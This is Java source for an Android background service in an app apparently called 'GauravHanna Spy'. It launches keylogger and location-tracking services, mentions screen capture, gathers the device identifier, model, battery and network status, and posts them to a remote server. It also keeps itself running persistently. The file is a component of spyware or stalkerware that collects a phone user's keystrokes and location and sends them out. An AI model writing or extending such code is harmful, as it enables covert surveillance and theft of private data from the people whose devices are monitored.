package com.gauravhanna.spy;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class BackgroundService extends Service {
    private static final String CHANNEL_ID = "gauravhanna_spy_channel";
    private static final int NOTIFICATION_ID = 123;
    private static final String BASE_URL = "https://gauravhanna-spy.onrender.com/api"; // Update with your actual URL
    private OkHttpClient client;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, getNotification());

        // Initialize OkHttpClient
        client = new OkHttpClient();

        // Start data collectors
        startService(new Intent(this, LocationService.class));
        startService(new Intent(this, KeyloggerService.class));
        // Start MediaProjectionService if needed (requires user consent)
        
        // Report device info immediately on start
        reportDeviceInfo();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID,
                    "GauravHanna Spy Service",
                    NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification getNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("GauravHanna Spy")
                .setContentText("Monitoring active")
                .setSmallIcon(android.R.drawable.ic_menu_view)
                .build();
    }

    private void reportDeviceInfo() {
        String deviceId = getDeviceId(this);
        if (deviceId == null) return;
        
        String deviceName = Build.MODEL;
        String deviceModel = Build.MANUFACTURER + " " + Build.MODEL;
        String androidVersion = Build.VERSION.RELEASE;
        
        // Get battery level
        float batteryPct = 0;
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                if (level != -1 && scale != -1) {
                    batteryPct = level / (float) scale * 100;
                }
            }
        } catch (Exception e) {
            Log.e("BackgroundService", "Error getting battery info", e);
        }
        
        String networkStatus = isOnline(this) ? "online" : "offline";

        JSONObject json = new JSONObject();
        try {
            json.put("deviceId", deviceId);
            json.put("deviceName", deviceName);
            json.put("deviceModel", deviceModel);
            json.put("androidVersion", androidVersion);
            json.put("battery", batteryPct);
            json.put("networkStatus", networkStatus);
        } catch (Exception e) {
            Log.e("BackgroundService", "Error creating JSON", e);
            return;
        }

        // Send to server via /api/client/device-info
        RequestBody body = RequestBody.create(
            MediaType.parse("application/json"), 
            json.toString()
        );
        
        Request request = new Request.Builder()
                .url(BASE_URL + "/device-info")
                .post(body)
                .build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e("BackgroundService", "Failed to send device info", e);
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.d("BackgroundService", "Device info sent successfully");
                } else {
                    Log.e("BackgroundService", "Server error: " + response.code());
                }
                response.close();
            }
        });
    }

    private String getDeviceId(Context context) {
        // Implement your device ID logic here
        // For Android 10+, you need to handle permissions properly
        try {
            android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) 
                    context.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    // For Android 10+, use something else or request READ_PRIVILEGED_PHONE_STATE
                    return android.provider.Settings.Secure.getString(
                            context.getContentResolver(),
                            android.provider.Settings.Secure.ANDROID_ID);
                } else {
                    return tm.getDeviceId();
                }
            }
        } catch (SecurityException e) {
            Log.e("BackgroundService", "Permission denied for getDeviceId", e);
        }
        // Fallback to Android ID
        return android.provider.Settings.Secure.getString(
                context.getContentResolver(),
                android.provider.Settings.Secure.ANDROID_ID);
    }

    private boolean isOnline(Context context) {
        android.net.ConnectivityManager cm = (android.net.ConnectivityManager) 
                context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm != null) {
            android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
        }
        return false;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Start data collection tasks (could use WorkManager)
        DataCollector.scheduleDataCollection(this);
        
        // Report device info periodically (optional)
        // You can use Handler or WorkManager for periodic reporting
        
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (client != null) {
            client.dispatcher().executorService().shutdown();
        }
    }

    @Override
    public IBinder onBind(Intent intent) { 
        return null; 
    }
}